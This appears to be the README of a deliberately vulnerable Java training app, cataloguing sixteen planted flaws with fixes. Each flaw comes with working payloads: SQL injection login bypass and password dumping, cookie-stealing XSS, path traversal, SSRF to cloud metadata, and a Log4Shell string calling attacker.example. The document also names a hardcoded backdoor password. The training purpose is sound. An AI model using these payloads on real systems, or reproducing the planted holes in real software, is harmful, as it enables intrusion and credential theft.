# VulnLab — Intentional Vulnerabilities Reference

This document lists every intentionally-introduced vulnerability in this repository,
added under `com.webapp.vulnlab` for AppSec training: practicing Semgrep rule-writing,
Snyk/OWASP Dependency-Check (SCA), and manual exploitation (Burp/ZAP).

**Do not deploy this application publicly without restricting network access first.**
See [Deployment Safety](#deployment-safety) at the bottom before pushing to a real server.

---

## Index

| # | Vulnerability | OWASP 2021 | CWE | File |
|---|---|---|---|---|
| 1 | SQL Injection — Error-based | A03 Injection | CWE-89 | `SearchServlet.java` |
| 2 | SQL Injection — Blind Boolean-based | A03 Injection | CWE-89 | `SearchBlindServlet.java` |
| 3 | SQL Injection — Union-based | A03 Injection | CWE-89 | `ProductServlet.java` |
| 4 | SQL Injection — Auth Bypass | A03 Injection | CWE-89 | `LoginServlet.java` |
| 5 | Reflected XSS | A03 Injection | CWE-79 | `search.jsp` |
| 6 | Stored XSS | A03 Injection | CWE-79 | `CommentServlet.java` / `comment.jsp` |
| 7 | DOM-based XSS | A03 Injection | CWE-79 | `profile.jsp` |
| 8 | IDOR (Broken Object-Level Auth) | A01 Broken Access Control | CWE-639 | `ProfileServlet.java` |
| 9 | Broken Access Control (function-level) | A01 Broken Access Control | CWE-862 | `AdminServlet.java` |
| 10 | Path Traversal | A01 Broken Access Control | CWE-22 | `DownloadServlet.java` |
| 11 | SSRF | A10 SSRF | CWE-918 | `UrlPreviewServlet.java` |
| 12 | NoSQL Injection | A03 Injection | CWE-943 | `NoSqlLoginServlet.java` |
| 13 | Hardcoded Credentials / Backdoor | A07 Auth Failures | CWE-798 | `LoginServlet.java` |
| 14 | Plaintext Password Storage | A02 Cryptographic Failures | CWE-256 | `DBInitListener.java` |
| 15 | Vulnerable Component — Log4Shell | A06 Vulnerable Components | CVE-2021-44228 | `pom.xml` + `LoginServlet.java` |
| 16 | Open Redirect (bonus) | A01 Broken Access Control | CWE-601 | `RedirectServlet.java` |
| — | Vulnerable Component — old H2 driver | A06 Vulnerable Components | CVE-2018-14335 / CVE-2021-42392 | `pom.xml` |

---

## 1. SQL Injection — Error-based

**Endpoint:** `GET /search?q=`
**Root cause:** `q` is concatenated directly into `SELECT ... WHERE name LIKE '%" + q + "%'"`, and any resulting SQL exception's raw message (`e.getMessage()`) is shown on the page.

**Try it:**
```
/search?q=laptop' AND '1'='1
/search?q=laptop'
```
The second payload (a lone `'`) breaks the SQL syntax and the raw H2 error — including column/table hints — is reflected back. That confirms injectability *and* leaks schema information, which is what makes this "error-based": you don't have to guess blind, the database tells you what's wrong.

**Fix:** Use a `PreparedStatement` with `?` placeholders, and never show raw exception text to the client — log it server-side and show a generic error page instead.

---

## 2. SQL Injection — Blind Boolean-based

**Endpoint:** `GET /search-blind?id=`
**Root cause:** `id` is concatenated into `WHERE id = " + id`, but *all* exceptions are swallowed — the page only ever prints "Product exists" or "Product not found".

**Try it:**
```
/search-blind?id=1 AND 1=1     -> "Product exists"
/search-blind?id=1 AND 1=2     -> "Product not found"
```
Since no error text or data leaks, an attacker must infer answers one true/false bit at a time — e.g. testing `SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'` repeatedly to extract a password character by character. Slower than error-based/union-based, but works even when the app "looks" safe (no errors ever shown).

**Fix:** Same as above — parameterize the query. The error-swallowing pattern itself is fine defensively (don't leak errors); the actual bug is the string concatenation feeding the query.

---

## 3. SQL Injection — Union-based

**Endpoint:** `GET /products?category=`
**Root cause:** `category` is concatenated into `WHERE category = '" + category + "'"`, and results (exactly 2 columns: name, price) are rendered directly into an HTML table.

**Try it:**
```
/products?category=nonexistent' UNION SELECT username, password FROM users --
```
Because the query returns exactly 2 string-like columns, an attacker can `UNION SELECT` two columns from a completely different table (`users`) and have them rendered in the same "name / price" table positions — dumping usernames and passwords through a product search box.

**Fix:** Parameterized query. Also: never let error messages reveal the column count (used here to make union-based exploitation easy to demonstrate) — in a real app this is inferred via `ORDER BY N` probing.

---

## 4. SQL Injection — Authentication Bypass

**Endpoint:** `POST /login`
**Root cause:** `SELECT ... WHERE username='" + username + "' AND password='" + password + "'"`.

**Try it (username field, any password):**
```
admin' --
' OR '1'='1
```
`admin' --` comments out the rest of the query (`-- ` is a SQL comment), so the query becomes `WHERE username='admin'` with no password check at all — logs in as admin without knowing the password. `' OR '1'='1` makes the WHERE clause always true, logging in as whichever row the DB returns first.

**Fix:** `PreparedStatement`, plus never compare passwords in plaintext (see #14) — use a hashed comparison (bcrypt/argon2) even after parameterizing.

---

## 5. Reflected XSS

**Page:** `search.jsp` (fed by `/search?q=`)
**Root cause:** `<%= request.getAttribute("query") %>` — the raw `q` parameter is written into the HTML response with no encoding.

**Try it:**
```
/search?q=<script>alert(document.cookie)</script>
```
The payload never touches the database or any storage — it exists only in this one request/response round-trip. That's "reflected": the attacker must get a victim to click a crafted link containing the payload for it to execute in the victim's browser.

**Fix:** HTML-encode before output — JSTL `<c:out value="${param.q}"/>` or `org.apache.commons.text.StringEscapeUtils.escapeHtml4(q)`.

---

## 6. Stored XSS

**Page:** `comment.jsp` (fed by `POST /comment`)
**Root cause:** The comment INSERT is parameterized (no SQLi here), but on **read**, `<%= c[1] %>` writes the raw stored message into the page.

**Try it:** Submit a comment with message:
```
<script>alert(document.cookie)</script>
```
Then just visit `comment.jsp` normally — the script now runs for *every visitor*, not just you. That persistence + blast radius (every viewer, not just the submitter) is what makes Stored XSS generally considered more severe than Reflected XSS.

**Fix:** HTML-encode on output, same as #5. Consider also a Content-Security-Policy header as defense-in-depth.

---

## 7. DOM-based XSS

**Page:** `profile.jsp`
**Root cause:** Client-side JavaScript reads `location.hash` and writes it into the DOM via `innerHTML`, entirely in the browser.

**Try it:**
```
profile.jsp#name=<img src=x onerror=alert(document.cookie)>
```
Notice this URL fragment (`#...`) is **never sent to the server at all** — it's purely client-side. That's what makes it "DOM-based": you won't find this bug by looking at server logs or server-side code (like `LoginServlet.java`); you have to read the client-side JavaScript itself, or use a browser-based/DAST scanner.

**Fix:** Never insert untrusted strings via `innerHTML`. Use `textContent` for plain text, or an HTML-sanitizing library (e.g. DOMPurify) if HTML is genuinely required.

---

## 8. IDOR (Broken Object-Level Authorization)

**Endpoint:** `GET /profile?id=`
**Root cause:** The SQL query *is* parameterized — no SQLi here — but the servlet never checks whether the current session's user is allowed to view the requested `id`.

**Try it:**
```
/profile?id=1
/profile?id=2
/profile?id=3
```
Each one returns a different user's SSN, with zero authentication or ownership check. This is a great example of why "the query is safe" and "the endpoint is safe" are two completely different claims — SQLi and IDOR are independent bug classes.

**Fix:** Check `session.getAttribute("username")` (or a role) against the requested resource's owner before returning data; return 403 if they don't match (unless the caller has admin rights).

---

## 9. Broken Access Control — Missing Function-Level Authorization

**Endpoint:** `GET /admin`
**Root cause:** No authentication check of any kind before dumping every user's username, role, and SSN.

**Try it:** Just visit `/admin` directly, logged in or not.

**Fix:** Check `session.getAttribute("role")` equals `"admin"` at the top of the servlet (or better, enforce it centrally via a servlet `Filter` so no individual endpoint can forget it).

---

## 10. Path Traversal

**Endpoint:** `GET /download?filename=`
**Root cause:** `new File(BASE_DIR + filename)` with no normalization or containment check.

**Try it:**
```
/download?filename=test.txt                          (intended use)
/download?filename=../../../../../../etc/passwd       (escape the uploads/ folder)
/download?filename=../WEB-INF/web.xml                 (read app internals)
```

**Fix:** Resolve the file with `file.getCanonicalPath()` and verify it still starts with the canonical `BASE_DIR` path before serving it; reject any filename containing `..` or path separators outright as a first line of defense.

---

## 11. SSRF — Server-Side Request Forgery

**Endpoint:** `GET /url-preview?url=`
**Root cause:** The server fetches any client-supplied URL with no host/scheme allowlist.

> **This is the most dangerous lab page here if the app is ever deployed on real cloud infrastructure.**
> On AWS EC2 with the legacy IMDSv1 metadata service enabled, requesting
> `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
> returns temporary AWS credentials for whatever IAM role is attached to the instance —
> this exact technique was central to the 2019 Capital One breach. See
> [Deployment Safety](#deployment-safety) below.

**Try it (safe demo, no cloud impact):**
```
/url-preview?url=http://example.com
/url-preview?url=http://localhost:8080/WebApp/admin
```

**Fix:** Maintain an allowlist of permitted destination hosts/schemes; resolve DNS and reject if the resolved IP falls in a private/link-local range (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `127.0.0.0/8`); disable HTTP redirects or re-validate the destination after every redirect hop.

---

## 12. NoSQL Injection

**Endpoint:** `POST /nosql-login` *(requires `MONGO_URI` env var — inert otherwise)*
**Root cause:** The entire raw JSON request body becomes the MongoDB query filter via `Document.parse(body)`.

**Try it (once a MongoDB instance is configured):**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```
`$ne: null` means "not equal to null" — i.e. "match anything". This filter matches the first user in the collection regardless of actual credentials, the NoSQL equivalent of `' OR '1'='1`.

**Fix:** Never pass a raw client-supplied object as a query filter. Extract expected fields explicitly as strings (`doc.getString("username")`), and build the filter yourself with `Filters.eq(...)`.

---

## 13. Hardcoded Credentials / Backdoor

**Location:** `LoginServlet.java` — `BACKDOOR_PASSWORD = "backdoor_devsecops_2020"`

**Try it:** Submit that exact string as the password (any username) — logs in as admin, bypassing the database entirely.

**Fix:** Never hardcode credentials or bypass logic in source. If a break-glass account is genuinely needed, use a securely-stored, rotatable secret (vault/secrets manager) with full audit logging — not a string literal in version control.

---

## 14. Plaintext Password Storage

**Location:** `DBInitListener.java` seed data + `LoginServlet.java` comparison logic.

Passwords are stored as plain text in the `users` table and compared with a plain SQL `=`. If the database is ever breached (or leaked via SQLi #4), every password is immediately usable — no cracking required.

**Fix:** Hash passwords with a slow, salted algorithm (bcrypt, scrypt, or argon2) at signup, and compare using the algorithm's verify function — never store or compare the plaintext value.

---

## 15. Vulnerable & Outdated Components (SCA target)

**File:** `pom.xml`

- `log4j-core:2.14.1` — **Log4Shell**, CVE-2021-44228 / CVE-2021-45046. Actually exercised in `LoginServlet.java`, which logs the raw `username` parameter. Sending a username of `${jndi:ldap://attacker.example/a}` would, on a real vulnerable deployment with outbound network access, trigger the logger to perform a JNDI lookup — leading to remote code execution. One of the most severe Java vulnerabilities ever disclosed.
- `h2database:1.4.197` — old H2 driver with known CVEs (unauthenticated H2 Console access issues / JNDI-related RCE in the H2 console component, patched in later 2.x releases).

**This is your primary Snyk / OWASP Dependency-Check / Trivy target.** Run your SCA tool against `pom.xml` and confirm both are flagged before moving on to fixing them (bump `log4j-core` to `>= 2.17.1`, `h2` to `>= 2.1.210`).

---

## 16. Open Redirect (bonus)

**Endpoint:** `GET /redirect?url=`
**Root cause:** `resp.sendRedirect(url)` with no allowlist.

**Try it:**
```
/redirect?url=https://example.com
```
In a phishing scenario, an attacker sends a victim a link to your *real, trusted* domain (`yourapp.com/redirect?url=evil.example`), the victim trusts the domain shown in the link/hover preview, clicks, and is silently forwarded to the attacker's look-alike site.

**Fix:** Only allow redirects to a fixed allowlist of internal paths, or validate the target host against your own domain before redirecting.

---

## Deployment Safety

This app is deployed to a real AWS EC2 instance running Tomcat. Before pushing any of
this to that server, or at minimum before leaving it publicly reachable:

1. **Restrict the EC2 security group** — allow inbound HTTP/HTTPS only from your own IP
   (or a small trusted range), not `0.0.0.0/0`, while this app is live.
2. **Enforce IMDSv2 on the instance** (`aws ec2 modify-instance-metadata-options
   --http-tokens required`) — this alone blocks the simple SSRF-to-metadata technique
   described in vulnerability #11, even if the app stays exposed.
3. **Attach a minimal/no-op IAM role** to this instance (or none at all) so that even if
   SSRF-to-metadata succeeds, there's nothing sensitive for the attacker to obtain.
4. **Don't reuse real passwords anywhere in this app** — everything in `DBInitListener.java`
   is throwaway lab data.
5. When you're done practicing a given vulnerability, redeploy the fixed version before
   leaving the instance running unattended.

## Suggested workflow with this repo

1. Run Semgrep against the code and see how many of the 16 it catches out of the box:
   ```bash
   semgrep --config=auto --config=p/java src/
   ```
2. For any it misses, try writing a custom rule targeting that specific pattern (great
   rule-writing practice — see the Semgrep docs and `semgrep-rules` GitHub repo).
3. Run your SCA tool (Snyk CLI / OWASP Dependency-Check) against `pom.xml` and confirm
   it flags `log4j-core:2.14.1` and `h2:1.4.197`.
4. Manually exploit each one using the payloads above (Burp Suite / curl / browser).
5. Fix them one at a time, re-running Semgrep + SCA after each fix to confirm it's
   actually resolved — this is the real "shift-left" loop.
